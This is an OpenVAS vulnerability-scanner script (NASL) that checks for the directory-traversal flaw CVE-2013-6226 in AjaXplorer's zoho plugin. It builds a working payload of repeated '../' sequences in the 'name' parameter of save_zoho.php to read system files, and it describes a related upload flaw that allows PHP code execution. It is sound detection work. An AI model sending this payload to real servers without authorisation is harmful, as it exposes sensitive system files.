###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ajaxplorer_zoho_plugin_dir_trav_vuln.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# AjaXplorer zoho plugin Directory Traversal Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803970");
  script_version("$Revision: 11865 $");
  script_cve_id("CVE-2013-6226", "CVE-2013-6227");
  script_bugtraq_id(63647, 63662);
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-11-26 12:27:43 +0530 (Tue, 26 Nov 2013)");
  script_name("AjaXplorer zoho plugin Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is running AjaXplorer with zoho
  plugin and is prone to directory traversal and file upload vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET
  request and check whether it is able to read the system file or not.");

  script_tag(name:"insight", value:"The flaws exist due to improper validation
  of user-supplied input via 'name' parameter and improper validation of file
  extensions by the save_zoho.php script.");

  script_tag(name:"impact", value:"Successful exploitation may allow an attacker
  to obtain sensitive information, and upload a malicious PHP script, which could
  allow the attacker to execute arbitrary PHP code on the affected system.");

  script_tag(name:"affected", value:"AjaXplorer zoho plugin 5.0.3 and probably
  before.");

  script_tag(name:"solution", value:"Upgrade to AjaXplorer 5.0.4 or later.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/88667");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/88668");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2013-11/0043.html");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://pyd.io");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

ajax_port = get_http_port(default:80);

if(!can_host_php(port:ajax_port)){
  exit(0);
}

files = traversal_files();

foreach dir (make_list_unique("/", "/ajaxplorer", "/xplorer", cgi_dirs(port:ajax_port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"), port:ajax_port);

  if(rcvRes && 'Set-Cookie: AjaXplorer' >< rcvRes)
  {
    foreach file (keys(files))
    {
      url = dir + "/plugins/editor.zoho/agent/save_zoho.php?ajxp_action=get_file&name=" +
            crap(data:"../", length:3*15) + files[file];

      if(http_vuln_check(port:ajax_port, url:url, pattern:file))
      {
        report = report_vuln_url( port:ajax_port, url:url );
        security_message(port:ajax_port, data:report);
        exit(0);
      }
    }
  }
}

exit(99);